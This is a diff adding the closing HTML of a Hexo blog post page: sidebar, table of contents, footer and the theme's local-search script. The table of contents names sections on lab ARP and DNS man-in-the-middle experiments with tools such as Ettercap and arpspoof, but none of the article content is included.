+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">spira1</p>
+              <p class="site-description motion-element" itemprop="description">路还很长，我的目标是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">76</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eagerseven@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#实验环境："><span class="nav-number">1.</span> <span class="nav-text">实验环境：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#subterfuge"><span class="nav-number">2.</span> <span class="nav-text">subterfuge</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#实验步骤："><span class="nav-number">2.1.</span> <span class="nav-text">实验步骤：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#前期准备"><span class="nav-number">2.1.1.</span> <span class="nav-text">前期准备</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#开始攻击"><span class="nav-number">2.1.2.</span> <span class="nav-text">开始攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ARPspoof"><span class="nav-number">3.</span> <span class="nav-text">ARPspoof</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#实验步骤：-1"><span class="nav-number">3.1.</span> <span class="nav-text">实验步骤：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ettercap——ARP中间人攻击"><span class="nav-number">4.</span> <span class="nav-text">Ettercap——ARP中间人攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#实验步骤"><span class="nav-number">4.1.</span> <span class="nav-text">实验步骤</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ettercap——DNS中间人攻击："><span class="nav-number">5.</span> <span class="nav-text">Ettercap——DNS中间人攻击：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基础演示"><span class="nav-number">5.1.</span> <span class="nav-text">基础演示</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#高级进阶"><span class="nav-number">6.</span> <span class="nav-text">高级进阶</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dsniff-amp-ARP欺骗："><span class="nav-number">7.</span> <span class="nav-text">Dsniff&amp;ARP欺骗：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">spira1</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+-->
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
